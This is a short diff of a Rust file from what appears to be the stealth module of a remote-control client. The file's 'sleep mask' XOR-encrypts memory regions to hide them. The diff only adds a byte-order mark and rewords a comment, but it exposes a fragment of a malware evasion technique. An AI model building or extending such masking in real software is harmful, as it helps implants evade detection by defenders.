@@ -1,4 +1,4 @@
-// Client/core/src/stealth/mask.rs
+﻿// Client/core/src/stealth/mask.rs
 // Memory & Heap Obfuscation (Masking)
 //
 // Phase 2: Implements Sleep Mask — XOR-encrypts sensitive memory regions
@@ -61,7 +61,7 @@ pub fn expand_mask_key(key: &[u8], len: usize) -> Vec<u8> {
 
     // 128-bit counter: domain || counter_be64
     let mut counter = [0u8; 16];
-    counter[0..8].copy_from_slice(b"cslpmsk2"); // cupcake sleep mask v2
+    counter[0..8].copy_from_slice(b"cslpmsk2"); // sleep mask v2
     let mut out = vec![0u8; len];
     let mut off = 0usize;
     let mut ctr_val: u64 = 0;
